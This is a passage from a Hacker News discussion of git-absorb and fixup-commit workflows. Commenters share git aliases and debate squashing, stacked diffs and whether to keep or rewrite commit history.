workflow. Because there are multiple ways to avoid \"fix lint\" commits. One of those is \"squash & merge.\" But if you don't want to use \"squash & merge\" in a particular case, then the only way to avoid \"fix lint\" commits is to do fixups. And git-absorb will help you find the commits to create fixups for automatically. That's it. reply JeremyNT 1 hour agoparentprevI am (what I assumed to be) an extensive user of fixup (usually invoked via interactive rebase). I'm intrigued by this but curious as to how it can really save so much time. Are people fixup'ing a lot more than I do? I might do it once or twice per MR and it's never a large burden to fix the right commit. If things get really out of hand such that the whole thing is a mess I just squash. Whatever history I had before is almost by definition gross and wrong in this scenario, and I don't mind losing it. reply burntsushi 50 minutes agorootparentIt's same kind of thing people tell me about ripgrep. \"Why bother with ripgrep, grep has always been fast enough for me.\" That might well be true. Or maybe we value time differently. Or maybe none of your use cases involve searching more than 100K lines of code, in which case, the speed difference between GNU grep and ripgrep is likely imperceptible. Or maybe being faster unlocks different workflows. (The last one is my favorite. I think it's super common but little is written about it. Once something becomes fast enough, it often changes the way you interact with it in fundamental and powerful ways.) Because I have git-absorb, I tend to be a bit more fearless when it comes to fixups. It works well enough that I can be pretty confident that it will take most of the tedium away. So in practice, maybe git-absorb means I wind up with fewer squashes and fewer \"fix lint\" commits because I don't want to deal with finding the right commit. My use of git-absorb tends to be bursty. Usually when I'm trying to prepare a PR for review or something along those lines. It is especially useful when I have changes that I want to be fixed up into more than one distinct commit. git-absorb will just do it automatically for me. The manual approach is not just about finding the right commit. It also means I need to go through git-add in patch mode to select the right things to put into a fixup commit, and then select the other things for the other commits. So it actually winds up saving a fair bit of work in some cases. Another example is renaming. Maybe PR review revealed the names of some functions were bad. Maybe I introduced two functions to be renamed in two distinct commits. I could do first rename -> first commit -> second rename -> second commit Or I could do: both renames -> git add -p -> first commit -> second commit Or I could do: both renames -> git absorb In practice, my workflow involves all three of these things. But that last git-absorb option eats into some of the first two options and makes it much nicer. reply masklinn 14 hours agoparentprevI’ve been using autofixup for this and it’s been ok but not great, it can be quite slow as things grown, and it doesn’t say anything when there was no match so it’s easy to miss. How does absorb surface that? > Perhaps partially due to how GitHub works. That’s definitely a major factor, I’d like to use stacked PRs they sound really neat, but GitHub. Also even with stacked PRs I figure sometimes you’re at the top of the stack and you change things which affect multiple commits / prs anyway, surely in that case you need to fixup other commits than the ToS? reply burntsushi 6 hours agorootparent> I’ve been using autofixup for this and it’s been ok but not great, it can be quite slow as things grown, and it doesn’t say anything when there was no match so it’s easy to miss. How does absorb surface that? I haven't used autofixup, but: * git-absorb has always been pretty snappy. I don't think it scales with repository size. * If there's no match, then the things that don't match stay in the staging area and don't make it into a commit. git-absorb will also note this in its output after running it. reply Degorath 11 hours agorootparentprevGitHub's quirks definitely make life much harder than it needs to be, but I've been using `git machete` for months now with great success in my team. The __one__ thing GitHub has that makes it all work is the fact that if you merge the parentmost branch, its immediate child will retarget its base branch. I think if I had full \"control\" over my company's SCM workflows I would use a tool that considers a branch as a workspace and every commit in the branch becomes its own PR (personal preference, but in my experience it also motivates people to split changes more), but alas. reply keybored 11 hours agorootparentprevThe term Stacked PRs already sounds like a term that was invented specifically in order to communicate in a GitHub-influenced context. Because Stacked PRs are just a reinvention of being able to review a commit at a time (the stack part is straightforward). reply travisb 9 minutes agorootparentStacked PRs are like being able to review a commit at a time, but add an additional layer of sequencing. It's most simply thought of as a patch series, where the evolution of each 'patch' is retained. That additional layer allows finer grained history and to mostly avoid (unreviewed) rebasing. Many teams find those properties valuable. reply masklinn 6 hours agorootparentprevStacked PRs is a way to surface the lifetime of the proposition as they get fixed or updated following reviews. It has nothing to do with github. reply keybored 3 hours agorootparentIt has nothing to do with GitHub in the sense that GitHub does not support it (I guess, I’m not up to touch). It does have something to do with GitHub in the sense that the name (PRs) and the benefits are framed from the standpoint of This is What GitHub Lacks. Which is a GitHub-centric perspective. https://news.ycombinator.com/item?id=41514663 reply Zitrax 13 hours agorootparentprevI assume you refer to https://github.com/torbiak/git-autofixup. I have also used it, and its ok but not perfect. reply krobelus 12 hours agorootparentI use git autofixup; it was much better than git absorb last time I checked > it doesn’t say anything when there was no match that's what it should do > it can be quite slow as things grown How? All the slowness (on large repos) I've seen has been fixed. reply masklinn 6 hours agorootparent> that's what it should do No it is not. > How? I don’t know, that’s just an observation from using it, semi regularly I autofixup changes and it takes a while to do anything. reply notlinus 13 hours agoparentprevCriticism isn't negativity. We're not Pollyannas here, we're adults who can handle critique. reply burntsushi 6 hours agorootparentCan you give me an example of criticism that is not negative? As far as I know, all forms of criticisms involve pointing out a flaw or fault. There's constructive criticism, but it's still fundamentally negative. Either way, feel free to replace the word \"negative\" with \"criticism\" in my comment if you want. It expresses the same thing I intended to express: I disagree with the criticism. If we're not Pollyannas and we're all \"adults who can handle criticism,\" then you should also be able to handle criticism of criticism. It goes both ways. reply beart 4 hours agorootparentI've been thinking about your comment that all criticism is negative and I'm not sure where to go with that in my mind. I think it very much depends on your definitions of \"criticism\" and \"negative\". For example, a movie critic could praise a movie, 100% score, no faults. That's still a criticism by many definitions. But the interesting thing about this is \"the eye of the beholder\". I suppose to some folks, all criticism does seem to be negative... which is why code reviews can turn into nightmares... and helps explain why I recently received a very angry phone call from another engineer because of some changes that were made to \"his code\". For the purposes of this discussion, the oddity seems to be the folks jumping to defend the software they had no part in creating. Why does the criticism result in negative feelings for them? I can understand the author taking issue with it, but someone else's criticism should not impact another's ability to utilize the software for whatever purposes. reply burntsushi 3 hours agorootparentI don't want to play a definitions game and dissect word meanings here. I think it's usually a waste of time. That's why I implored folks to just accept a revision in wording in my previous comment. What I intended to convey was this: 1. There were many comments providing criticism that I disagreed with. 2. I felt that the vibe given by the comments at the time was not commensurate with how much utility the tool brought me in my own workflow. So it seemed useful to point this out. That is, that there was a gap in the commentary that I thought I could fill. Obviously I won't be using this phrasing again because it spawned off a huge meta sub-thread that I think is generally a huge waste of time and space. > For the purposes of this discussion, the oddity seems to be the folks jumping to defend the software they had no part in creating. Why does the criticism result in negative feelings for them? I can understand the author taking issue with it, but someone else's criticism should not impact another's ability to utilize the software for whatever purposes. Again, it cuts both ways. Why isn't it odd for folks to jump in and express criticism of software they had no part in creating? If folks can express negative criticism, then why can't I express positive feedback? I didn't say people shouldn't make those comments. I said it was unwarranted. Or in other words, that it was undeserved and that I disagreed with it. Or that some balance was appropriate. This has literally nothing to do with my ability to utilize the software. I don't know why you're going down that road. reply j_maffe 6 hours agorootparentprevNegative comments are not always a product of negativity. Sometimes it's positive feedback to improve something that has potential. reply burntsushi 5 hours agorootparentI think that can be true and my top-level comment can be true simultaneously. I've also clarified what I meant at this point. reply cryptonector 2 hours agorootparentprevI think GP is saying that you didn't need to focus on the negativity (which is in itself negativity), just say the substantive thing that you wanted to say without editorializing about negativity. Your complaint (negativity) about negativity might be over-done, and anyways not useful. We can all shake our own heads at others' possibly-unnecessary negativity without having to be calling it out all the time. Meta arguments are not always useful. Besides, consider this negative comment: https://news.ycombinator.com/item?id=41653797 is it one of the negative comments you didn't like? It seems like a possibly-useful negative comment -- \"it didn't work for me because ...\" is useful unless it was really a matter of undiagnosed PEBKAC. Would you rather than comment not have been posted? Surely not. reply burntsushi 2 hours agorootparentI think I've clarified my position in other follow-up comments sufficiently that everything you said here has already been addressed. I even already said I would use different wording next time. And I never said folks shouldn't make those comments. I clarified that too. reply Y_Y 9 hours agorootparentprevI'd be in favour of auto-stickying this. I see a lot of e-ink spilled over arguments that boil down to whether or not it's ok to comment about not liking some aspect of the subject under discussion. There are good reasons not to criticize in some situations, but I don't think they apply here. Either way the arguments are tiresome. We should agree to ban criticism, or agree not to argue about it (barring special circumstances). reply tpoacher 11 hours agorootparentprevI had to look up the reference, and based on the wikipedia plot summary at least, I admit I don't quite get the relevance. I expected a plot where someone handles criticism quite badly and suffers as a result, but in fact the plot was actually about someone who handled criticism very well instead, and improved the lives of others as a result? So now I'm curious! In what way does Pollyanna relate to adults who can't handle critique? Have I got the wrong Pollyanna by any chance? xD reply talideon 10 hours agorootparentA Pollyanna is somebody who's cheerful and optimistic to a fault, i.e., even when it's unjustified. The plot summary of the book is likely not what you should be reading as it's become an idiom. Something like Wiktionary or another dictionary would be a better place to look it up. In this case, it's not about being able to receive criticism, but about being reticent about _giving_ it. reply Y_Y 9 hours agorootparent> The plot summary of the book is likely not what you should be reading as it's become an idiom. This is a good and perhaps under-appreciated point. When I first read the term \"Polyanna\" I made the same mistake as GP. I think if you read \"The Prince\" to find out what \"Machiavellian\" meant you'd be no better than when you started. Even terms like \"Kafkaesque\" have taken on lives of their own and are probably better not thought of as mere literary references. reply ekidd 8 hours agorootparentMachiavelli's \"The Prince\" will give you a decent understanding of what people usually mean by \"Machiavellian\". The book explains what methods would allow an absolute ruler to stay in control of state. It does not generally make moral judgments about those methods. Machiavelli's \"Discourses\" is the one that will really confuse a reader looking to understand the colloquial meaning of \"Machiavellian\". In this book, Machiavelli lays out a vision of a healthy \"republic\" (or more precisely, res publica) which benefits the people who live in it. Among other things, Machiavelli argues that republics actually benefit from multiple competing factions, and from some kind of checks and balances. Apparently these ideas influenced several of the people who helped draft the Constitution of the United States. Now why Machiavelli had two such different books on how governments worked is another interesting question... reply Y_Y 7 hours agorootparent> Machiavellian > adjective > uk /ˌmæk.i.əˈvel.i.ən/ us /ˌmæk.i.əˈvel.i.ən/ > using clever but often dishonest methods that deceive people so that you can win power or control (from https://dictionary.cambridge.org/dictionary/english/machiave... ) Ymmv, but I think that's far from the point of the book, and isn't even the main topic. It's hard for me to imagine taking a person who'd never heard the term, letting them read the book, and then asking them to propose a definition, would produce anything like the above. reply unkulunkulu 11 hours agorootparentprevI’ve also thought about that based on the same info, i.e. not reading the source completely. There is a notion of a “Pollyanna mode” in schematherapy. What it means is ignoring negative facts and challenges with an outwardly positive attitude and avoiding addressing the issues themselves. This certainly can be harmful to oneself. Another harmful thing is hating and bashing oneself for mistakes and faults and I won’t make a comparative judgement, but a healthy way is supposed to be along the lines of speaking up openly about what bothers you and thinking what can be done about it if at all. reply tpoacher 11 hours agorootparentThis makes sense. Thank you for your comment! Learnt something new today :) reply AndrewHampton 18 hours agoprevFWIW, I've been using this alias for the past couple years for fixup commits, and I've been happy with it: > gfx='git commit --fixup $(git log $(git merge-base main HEAD)..HEAD --oneline| fzf| cut -d\" \" -f1)' It shows you the commits on the current branch and lets you select one via fzf. It then creates the fixup commit based on the commit you selected. reply psadauskas 2 hours agoparentI have this one in mine: https://github.com/paul/dotfiles/blob/master/git/.gitconfig#... # make a fixup commit for the last time the file was modified cff = \"!f() { [ -n $@ ] && git add $@ && git commit --fixup $(git last-sha $@); }; f\" # Get latest sha for file(s) last-sha = log -n1 --pretty=format:%h --grep 'fixup!' --invert-grep Given a file like `git cff path/to/file.rb`, It'll find the last commit that touched that file, and make a fixup commit for it. Its great for the try-this-change-on-CI cycle: Change the Dockerfile, git cff Dockerfile, push, repeat, without it screwing up because you changed a different file while you were working on it. reply mdaniel 1 hour agorootparentIt won't matter until it does, but $@ expands arguments into separate words but those expansions are themselves only word-preserved if the $@ is itself quoted. The [ will probably get away with what you want, but its use in $(git add) and $(git last-sha) almost certainly will not $ cat > tmp.shWhat if I want some parts of it into one commit and another parts into another? Looks like absorb will automatically break out every hunk into a separate fixup commit. My one-liner will create 1 fixup commit for everything that's staged. That's typically what I need, but on the occasions it's not, I use `git add -p`, as kadoban mentioned, to stage exactly what I want for each commit. reply mst 5 hours agorootparentOh, hrm, looking at this description and the one liner, I rather like. Once you mentioned `git add -p` I realised that this is pretty much what I do already, except with a far more efficient way of selecting the relevant commit to do it to. Muchas gracias. reply AndrewHampton 4 hours agorootparentYeah, I use about a dozen git aliases in my normal workflow. In case it's helpful, here are the relevant ones for this flow: alias git_main_branch='git rev-parse --abbrev-ref origin/HEADcut -d/ -f2' alias gapa='git add --patch' alias grbm='git rebase -i --autosquash $(git_main_branch)' alias gfx='git commit --fixup $(git log $(git_main_branch)..HEAD --oneline| fzf| cut -d\" \" -f1)' Another favorite is: alias gmru=\"git for-each-ref --sort=-committerdate --count=50 refs/heads/ --format='%(HEAD) %(refname:short)%(committerdate:relative)%(contents:subject)'| fzfsed -e 's/^[^[[:alnum:]]]*[[:space:]]*//'cut -d' ' -f1| xargs -I _ git checkout _\" gmru (git most recently used) will show you the branches you've been working on recently and let you use fzf to select one to check out. reply atq2119 10 hours agorootparentprevThen you use `git gui`, which is part of the git distribution itself, or `tig` if TUIs are your thing. I have a key binding for `git commit --squash=%(commit)` in my tig config, so I can interactively select lines or hunks to stage and then the target commit for the squash. reply kadoban 16 hours agorootparentprevThat sounds like what `git add -p` is for, stage part of the current changes. reply kccqzy 3 hours agorootparentThat still requires you to manually select hunks. The point of `hg absorb` is to automatically select hunks even if these hunks are to be squashed into different commits. reply k3vinw 15 hours agorootparentprevMight be able to use the multimode flag in the fzf command above and it should let you select more than one using Tab and Shift+Tab. reply emersion 2 hours agoparentprevWith a shell such as fish, one can \"git commit --fixup \" and a list of commits will be displayed. reply johnnypangs 14 hours agoparentprevI’ve been using this: alias gfixup=\"git commit -v --fixup HEAD && GIT_SEQUENCE_EDITOR=touch git rebase -i --stat --autosquash --autostash HEAD~2\" From what I understand it does the same thing as this crate for the most part. All I do after is: git push —force-with-lease Not sure what you get from the crate otherwise reply masklinn 13 hours agorootparentYour alias seems like a completely unecessary complexity. If you want to meld new changes into your branch head you can just alias “git commit --amend”, you don’t need that mess. Absorb will find the commits to fix up for each change in the working copy, it doesn’t just merge everything into the head. reply johnnypangs 9 hours agorootparentI see, the reason it’s that long complicated alias was that I didn’t want to open up the editor to change the commit every time I updated. “git commit —amend” does that. I read the rough how it works and it now makes sense. I might give it a try. Thanks! reply johnnypangs 9 hours agorootparentSeems like you can add —no-edit and get the same behavior, now I can delete that alias. Thanks again :) (Edit: typo) reply masklinn 6 hours agorootparentThat is correct, and there is a `--edit` to revert that, so my personal alias is to `git ci --amend --no-edit` such that by default it just merges the staging into the HEAD, and then tacking on `-e` will open the commit message in an editor to expand it. reply cryptonector 2 hours agorootparentYou can also set `EDITOR=true` for that `git commit --amend` if you forget about `--no-edit`. reply johnnypangs 14 hours agorootparentprevI guess the crate version is easier to soft reset? reply mckn1ght 17 hours agoparentprevsounds like how magit lets you create fixup commits in emacs reply AndrewHampton 7 hours agorootparentThis was 100% my inspiration. I used emacs+magit for years. After switching away from emacs for dev work, I still cracked it open for git interactions for another year or so. Eventually, I moved entirely to the shell with a bunch of aliases to replicate my magit workflow. reply masklinn 14 hours agorootparentprevWorse in fact, since magit lets you fixup, squash, or instafix. reply imiric 16 hours agoprevI tried using this tool after seeing recommendations for it, but IME it got the parent commit wrong enough times that the work to undo the damage was more than if I had looked up the commit myself and used `--fixup` instead. So I moved back to this manual workflow pretty quickly. I prefer having full control over my commit history, and this tool is too much magic for my taste. I'm sure that it could be improved so that mistakes are rare, but I'm not sure I would trust it enough to not have to review its work anyway. reply 3eb7988a1663 16 hours agoparentI use lazygit for this. Keyboard driven TUI which lets you easily re-order/squash commits with minimum fuss. Being able to see them all laid out means no futzing with identifying the right ids. reply imiric 16 hours agorootparentI rarely refer to commits by their IDs in these cases, though. More often than not I use the relative `HEAD~n`, when it's easy to determine `n` visually. With a few aliases, the manual fixup workflow really doesn't take much effort. reply arcanemachiner 14 hours agorootparentprevI love lazygit so much. I use it all the time, and it's constantly improving my workflow. reply insane_dreamer 5 hours agorootparentprevlazygit also my go-to for this and git in general reply montag 15 hours agorootparentprevThis sounds just right. reply adastra22 16 hours agoparentprevIf it just automatically created the fix up commit and moved it to the proper place in the commit tree, I’d be happy with that. You can then run a one-liner to merge the fix up commits after reviewing. reply BeeOnRope 15 hours agorootparentThat's exactly what it does by default. Only if you pass --and-rebase does it actually do the autosquash rebase for you. reply globular-toast 12 hours agoparentprevThe more worrying thing for me is how would you know whether it got it right or wrong? I suspect if you're using it the point is you're not going to go and inspect each commit manually. IMO something that looks right is far more dangerous than something that's merely wrong. reply gorjusborg 49 minutes agoprev'git rebase -i' meets this need and more. Everyone using git should learn to use it eventually. With it you can squash, fixup, reword, or delete commits interactively. reply pragma_x 30 minutes agoparentGlad I'm not the only one. Squashing branches pre-merge, or post-merge solves the problems of commit purity (main/develop/prod/etc always builds at every commit) while preserving the intent of any MR/PR. Squashing also makes rebases _A LOT_ easier; every bad day you've had executing a rebase is likely solved by squashing your feature/fix branch, first. Going back in time to fix the past just to sort your changes into the \"correct\" bin or vicinity of changes just seems unnecessarily complex. I am also unaware of what use-cases this supports. Are teams out there forcing commits to have a stricter scope than just \"anything in the codebase\"? Perhaps it's a monorepo pattern? I have no idea. Either way, you have to `git push --force` to modify your PR/MR. May as well use the stock workflow and learn how to clean up your branch. I also endorse `git commit --amend` for anyone that identifies as a \"micro-committer\" but doesn't need to preserve intermediate changes. Edit: re-reading comments - it sounds sort of like some teams prefer to bin changes like this in order to make a PR/MR browsable by commit, rather than inspect one big broad diff. Is that the case? reply burntsushi 37 minutes agoparentprevgit-absorb is a complementary tool to `git rebase -i`. git-absorb will create the fixup commits (from your staging area) for you and set them up for use with `git rebase -i --autosquash`. reply bradley13 13 hours agoprevMaybe I am being to much of a purist, but retroactively modifying commits and history? Why? Stuff happens, so do mistakes. Fix the mistakes, make another commit, and go on with your life. reply strunz 13 hours agoparentCommits should be a contained change that can be understood as a logical piece of history, and reverted if necessary. If you have to look at multiple commits for 1 logical change to the code, it's much more difficult to figured out what the intention was, if it was correct, and how it can be reverted. reply Terr_ 8 hours agorootparentI'd also point out that it's bad to have commits in the main branch where compilation or unit tests would fail, even when each bad-commit always arrives with an immediate \"oops, fixed\" commit trailing it. It messes up the team's ability to use tools like git-bisect to pinpoint behavior changes, and is generally more noise than signal. At a bare minimum, those spans should get squashed before they leave the PR or feature branch. reply notlinus 13 hours agorootparentprevDo you always make all of your logical code changes in single, atomic commits? What if you have to modify a feature later on? I'm sorry, but this is ridiculous. There's nothing wrong with having multiple commits in a row modifying something. That's how git works. GitHub's PR merge workflow really messed up the meta game, I tell you what... reply trashburger 10 hours agorootparentYes, always. Of course I make mistakes, but the idea is that any patch I put up for review, if it cleanly applies, should not break any user and any tests. It's much more liberating knowing that bisects actually work and each commit does exactly what it says on the tin (no followup \"fix\"/\"minor\" commits that actually do something completely different). Incremental improvements are compatible with this approach. Also see https://gist.github.com/thoughtpolice/9c45287550a56b2047c631... . reply brigandish 12 hours agorootparentprevI don't think you're arguing against the point being made. Logical change 1, implement Hello World: puts \"Hello, World!\" Logical change 2, make it a method: def hello_world puts \"Hello, World\" end Logical change 3, take an argument for the greeting: def hello_world(greeting) puts \"#{greeting}, World\" end Logical change 4, take an argument for the recipient: def hello_world(greeting, recipient) puts \"#{greeting}, #{recipient}\" end Logical change 5, improve the method name by showing the intent: def greet_recipient(greeting, recipient) puts \"#{greeting}, #{recipient}\" end Logical change 6, defaults…: def greet_recipient(greeting=\"Hello\", recipient) puts \"#{greeting}, #{recipient}\" end And so on. These could each be their own feature or part of a feature etc. What they are, though, is logically atomic. If you want to add a default recipient later, or next, that is its own logical commit. If you roll it back, each rollback will lead you to a logical difference, not some typo fix, e.g. def greet_recipient(greeting=\"Hell\", recipient) puts \"#{greeting}, #{recipient}\" end plus the missing \"o\" def greet_recipient(greeting=\"Hello\", recipient) puts \"#{greeting}, #{recipient}\" end Are one logical commit, for which I'd use a fixup or `git commit --amend` or whatever. What one considers logically atomic may differ from person to person, language to language, feature to feature… but they can be differentiated from things like typos quite easily. Personally, I make numerous commits in a feature branch, (transparently, too, my typos included - I'm not proud:) and before requesting review I'll clean up using rebase into as few logical commits as possible, and upon acceptance either squash it all to one or leave it as is, depending on the team's culture/needs. reply Terr_ 8 hours agorootparentIf those are all different commits, now imagine the fun of interactively rebasing them on top of a main branch where some other thing changed \"Hello, World\" to \"Greetings dear Globe.\" reply brigandish 7 hours agorootparentWhy is someone else writing my feature? Do we not have a ticket system? ;-) More importantly, when using a feature branch one should really rebase master into the feature branch regularly, and any other branches that might touch the same places, it takes care of little surprises like this. reply Terr_ 20 minutes agorootparentTo clarify, I meant a scenario where that very simplest version is already upstream, and your feature-branch contains 5-6 commits which are all different refactoring-steps or making the string literals override-able or abstracted away. When you need to rebase that onto main/master, there would be 5-6 stops to fix conflicts in a 3-way diff, and I don't think the kind of work in that example is compelling enough to justify that as opposed to having one (squashed) commit that simply states that you improved the method in several ways. P.S.: Sometimes more commits can make refactoring easier instead, often when it comes to splitting file rename/move operations from changing their content. reply recursive 2 hours agorootparentprev> Do we not have a ticket system? Maybe we do, maybe we don't. Maybe there are two tickets with a mutual dependence. Even without that, if you add a parameter to a method, and later someone uses it in a totally different PR, then you effectively can't revert the creation of the parameter. How are you going to track that dependency. I've heard the arguments about logical commits and the ability to cleanly revert them. I just haven't seen any code where that would actually work, even if the trouble was taking artisanally curate the commit history. reply vasergen 9 hours agorootparentprevI'd say pull request should be reverted if necessary, but an idea that each commit should be revertable and expectation that project should work after it is unneeded complexity for me. reply ozim 12 hours agoparentprevI am not history purist in that way. I don’t care about fixes for mistakes, if they are in your local branch do the cleanup before publish and if it is your own published branch force push is ok. Unless of course your changes were merged to common code already - then they become not touchable - just make a new commit with fix don’t try to be smart, common code rolls only forward and fixes are new commits. reply chippiewill 2 hours agoparentprevAmusingly it actually makes you less of a \"purist\" to not modify commits. Git was created by Linus Torvalds to support Linux Kernel development The Linux Kernel is heavily built around reviewing each commit individually via patchsets sent as emails and rewriting history to make it cleaner. Git history is incredibly valuable if its curated, at my previous employer we used Gerrit and pretty much every change would have a well crafted multi-line commit message that explained what was being changed and most importantly _why_. If I wanted to understand why a bit of the codebase had been authored in a particular way it was incredibly easy because I could just git blame the line and there'd be a detailed commit message explaining the rationale. In the Pull Request world I do agree with what you say - but only if you squash merge. Commits that say \"fix typo\" or \"oops\" or \"wip\" aren't useful long term. reply Izkata 6 hours agoparentprevFor me it's not purism, but practicality: The top comment right now mentions using this to apply linting changes to the original commit that introduced the linting violation, but I've seen linting commits introduce bugs often enough that I think those should always be a new separate commit, so a future maintainer can easily see why that kind of bug was introduced and what the fix is. reply gorset 13 hours agoparentprevThe use case is when you look at a branch as a series of patches. Reviewing a clean set of commits is much easier than a branch full of mistakes and wrong paths taken. Useful when we optimize for reviewing and good history for future maintenance. This has been important and useful when I’ve worked on big mission critical backend system, but I also understand it might not be the most important factor for a new project’s success. reply keybored 9 hours agorootparentA branch with some base is already a series of commits. I don’t get where the conceptual re-imagining is here. reply gorset 8 hours agorootparentPatch series comes from the linux kernel workflow, which git was developed to support. https://kernelnewbies.org/PatchSeries In this workflow you review every commit and not just the branch diff. Each commit is crafted carefully, and a well crafter series of commits can make even very large changes a brief to review. It takes a certain skill to do this well. As the page above says > Crafting patches is one of the core activities in contributing code to the kernel, it takes practice and thought. This is in contrast to using git more as a distributed filesystem where you don't care particularly much about the history, and you typically squash commits before merging etc. It's simpler and easier to work this way, but you lose some of the nice attributes of the linux kernel workflow. reply keybored 3 hours agorootparentThat’s a nice summary. What I don’t like about the Git documentation as I’ve read it is that they go between “patch” and “commit” in some places without stopping and explaining what the difference is. It makes sense to them. It’s obvious. But it isn’t necessarily obvious to most people. A patch is a patch proper plus a commit message encoded in a format that git am understands. That’s fine. And the core developers understand that you cannot transmit a commit snapshot via email (or you shouldn’t). But I prefer to mostly stick to “commit” in the abstract sense, whether that to-be-commit is from a pull or from an email (or: it’s in the form of an email and it could be applied as a commit). git rebase talks about “patch series” I think. Without explaining it. Why not “commit series”? Sometimes it seems like talking about your changes by the way it happened to be transmitted. It’s like talking about “attachments” instead of commits because you happened to send them via email as an attachment (instead of inline). Then you now have “stacked diffs” or “stacked commits”. Which are just a series of commits. Or a branch of commits (implicitly grounded by a base commit). For a while I was wondering what stacked diffs/stacked PRs/stacked patches and if I was missing out. When it just turned out to be, as you explain, essentially the Linux Kernel style of being able to review a commit in isolation. But in a sort of context that pull request inhabitants can understand. I prefer to mostly talk about these things as “commits”. (At several times writing those paragraphs above I wondered if I would be able to string together them in a coherent way) reply dclowd9901 13 hours agorootparentprevSo this wouldn’t work very well in workflows that flatten merges to a trunk? reply chippiewill 2 hours agorootparentTools where they allow you to squash merge tend to be fairly incompatible with stack diff workflows generally. It's tricky to review individual commits on Github and Gitlab and they don't even allow you to leave comments on the commit messages. In areas where people do review individual commits they tend to use tools that support that workflow. Git uses email patches where each commit is sent as a separate email. Tools like Gerrit do code review directly on a commit by commit basis and the usual strategy to get it into trunk is to either \"fast forward\" (advance the HEAD of the trunk branch to that commit) or to cherry-pick it. reply mst 5 hours agorootparentprevI like for non-trivial stuff to have a branch with a series of logical commits, cleanly rebased atop main, then use -no-ff to force a merge commit anyway. That way you can the whole branch appears as a single commit/diff atop main in primary history but you can dig in to the original components of it if/when that's useful. The primary obstacle to doing this for me is, if I'm honest, not having automated it sufficiently that I can't forget to do that. reply travisjungroth 12 hours agorootparentprevIt would mostly be unnecessary. The separate commits won’t matter after the PR if they’re getting squashed. Debatably, if you’re making changes during a PR review, it could be helpful to make those changes in relevant commits. That way if someone goes through them during the PR, they get one clean “story”, rather than see the pre-PR commits and the conversation after. reply theptip 6 hours agoparentprevIt sounds like you have never heard of the Stacked Diffs workflow. Here is an overview: https://newsletter.pragmaticengineer.com/p/stacked-diffs It’s a perfectly reasonable preference to eschew this workflow, but definitely worth understanding the pros and cons. reply dpkirchner 5 hours agorootparentEvery explanation of stacked diffs I've seen (including this one) makes me think there is some secret magic not being shared that will make the whole idea \"click\". If the problem is devs having to wait too long for PRs to be reviewed, breaking tasks up in to smaller diffs should exacerbate the problem, wouldn't it? If diff 2..n follow diff 1 then a review of 1 blocks everything else you're doing, eh? At least the traditional route, branching everything straight off of main, means you can merge 2..n and rebase 1 once it passes, leaving you less blocked. There must be something I'm missing because there are a lot of people promoting stacking diffs. reply johnmaguire 5 hours agorootparent> If the problem is devs having to wait too long for PRs to be reviewed, breaking tasks up in to smaller diffs should exacerbate the problem, wouldn't it? I find small diffs to be much easier to review and as a result I review them much practically as soon as they are posted. And I'm less likely to miss something. reply dpkirchner 3 hours agorootparentFor sure, I agree. However there is also a context switching cost and IMO switching between your IC work and, say, a dozen small diffs is rougher than a couple larger diffs. That opinion said I haven't experienced fast reviews myself, so maybe that's what I'm missing. reply steveklabnik 3 minutes agorootparentprevI recently mentally came around to stacked PRs, though I currently work mostly solo, and so don't use them. But I'm happy to try and talk with you about it. Maybe because I learned so recently it might help. > If diff 2..n follow diff 1 then a review of 1 blocks everything else you're doing, eh? At least the traditional route, branching everything straight off of main, means you can merge 2..n and rebase 1 once it passes, leaving you less blocked. I am a little confused about the scenario you're describing here: with the PR based flow, you can't merge the second half of the PR while waiting on some change to the first commit. So let me try to suggest a scenario. We're working on a web app. We're going to add a new feature. This requires some backend changes, and then some front end changes that use those back end changes. For the immediate purposes here, we're going to presume these are in the same PR. I'll talk about them as two PRs in a moment. We're also going to assume for the sake of simplicity that there's two commits in this PR: one for backend, one for frontend. With the PR workflow, you're asking for review from two people: a backend expert, and a frontend expert. Both are going to request changes, and you're gonna respond to all of them, and eventually things get to a good place and the PR is merged. Let's say that process takes a week. There's a few possible issues here: the first is, both people are going to get notifications for every change in the PR, even if it's not in the code that they need to review. This creates additional review fatigue for both reviewers. They also may need to check what's happened since the last time they reviewed things, and github doesn't always make that easy, though they do help sometimes in some circumstances. Another issue is, say that the backend changes are good to go, but there's more frontend work to do: because it's in the same PR, the backend change will not be integrated until the frontend change is done. And the backend reviewer will still be getting those pings. Notably, if the frontend change is ready first, they'll also be getting pings from more backend reviews too. In the stacked diff flow, and using those tools, each reviewer only needs to review their half individually. They will not get pinged for changes to the other half. They will be presented with only the diffs that affect the parts that they need to review. And, because you can land each diff in the stack whenever it's at the top (or bottom, depending on how you visualize things, I guess) of the stack, as soon as the backend commit is good to go, it can land, and the frontend commit can land at a later time. We've popped it off the stack. And no matter who finishes first, they won't get review pings for the other part's work. So, you might say: yeah, that's exactly why I'd make them as two separate PRs. And that may be a good idea. But to do that, you have two choices: wait until the backend stuff is fully done, and then start on the frontend stuff. That can work, sure, but maybe what you want to do needs the frontend work to influence the backend work, so treating it as one logical change before any of it hits master makes sense. So to do that, you make a frontend PR that, instead of branching off of master, branches off of the backend PR. Well, now you've reinvented stacked diffs, but you don't have any of the tooling to make that nice! Once the backend lands, you'll have to rebase the frontend off of master, stuff like that. ... does any of that make sense? reply cryptonector 2 hours agoparentprevIf you haven't pushed then you want to eventually push clean history. That's what rebasing is about. reply rom1v 13 hours agoparentprevhttps://www.mail-archive.com/dri-devel@lists.sourceforge.net... reply nextaccountic 13 hours agoparentprevIf it is unreleased it may make the life of reviewers easier. If they look at the commits at all, that is. But if not even reviewers are looking at commits I question whether a PR should be chunked in commits at all - why not squash all commits into a single one, so that every PR is composed of exactly one commit? Could maybe separating the changes in commits convey some information? reply toastal 9 hours agorootparentNormally creating a new feature involves independent actions like updating dependency, refactoring some module beforehand, & so on. If these things can be broken up in a way that make review & reading logs easier, why would you squash the whole history—especially if that history is already good. In as much as it would be ridiculous to go to the other extreme of committing ever character/line as a separate commit, just collapsing the whole history isn’t a good approach. There isn’t a hardened rule about where the line is but that is okay & up to developer discretion on how they want to ‘tell the story’ to a reviewer (or their future self) about how certain chunks should be read together. reply baq 3 hours agoparentprevthe history you're merging to the main branch is much more useful clean than accurate. reply eviks 11 hours agoparentprevBecause it's easier to understand later on when it's not spread out reply IshKebab 10 hours agoparentprevThe point of history is so that other people (or your future self) can look back at the history of the code and understand how it changed and why changes were made. There's zero value in retaining mistakes that were never merged into `master`. In fact there is negative value because it makes the history harder to follow. For example would you rather see \"review fixes\" in Git blame, or the actual useful commit message? You can argue that you can't be bothered to make your history nice; fine. But you can't say it's wrong to do that. (Personally I think you should squash commits for a MR; if it's too big to review as one commit it's too big for one MR - except for branches that multiple people have worked on over 